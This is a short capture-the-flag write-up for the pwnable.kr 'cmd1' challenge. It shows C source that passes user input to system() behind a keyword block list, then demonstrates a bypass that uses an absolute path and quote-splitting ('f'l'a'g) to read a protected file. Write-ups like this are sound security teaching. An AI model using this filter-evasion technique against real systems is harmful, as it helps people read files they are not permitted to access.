---
layout: post
title: pwnable.kr - cmd1
---

## Prompt
Mommy! what is PATH environment in Linux?

ssh cmd1@pwnable.kr -p2222 (pw:guest)

## Files
We are given an executable `cmd1`, its source `cmd1.c`, and a `flag` file.

**cmd1.c**:
```c
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "flag")!=0;
        r += strstr(cmd, "sh")!=0;
        r += strstr(cmd, "tmp")!=0;
        return r;
}
int main(int argc, char* argv[], char** envp){
        putenv("PATH=/thankyouverymuch");
        if(filter(argv[1])) return 0;
        system( argv[1] );
        return 0;
}
```
When run, `cmd1` overwrites the PATH with a dummy value using the `putenv()` function:
```bash
cmd1@pwnable:~$ env | grep PATH
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

[becomes]
PATH=/thankyouverymuch
```
It then filters `argv[1]` for the substrings "flag", "sh", and "tmp". If the argument contains one of these, the script ends. Otherwise, the command passed into `argv[1]` is run by the `system` with the privileges of the binary.

```bash
cmd1@pwnable:~$ ./cmd1 # no argv[1] provided
Segmentation fault (core dumped)
cmd1@pwnable:~$ ./cmd1 cat # PATH doesn't incl. cat
sh: 1: cat: not found
cmd1@pwnable:~$ ./cmd1 "/bin/cat a" # need to supply flag
/bin/cat: a: No such file or directory
cmd1@pwnable:~$ ./cmd1 "/bin/cat flag" # flag is filtered
cmd1@pwnable:~$ cat 'f'l'a'g # obfuscated flag
cat: flag: Permission denied
```

## Solution

```bash
cmd1@pwnable:~$ ./cmd1 "/bin/cat 'f'l'a'g"
{flag}
```
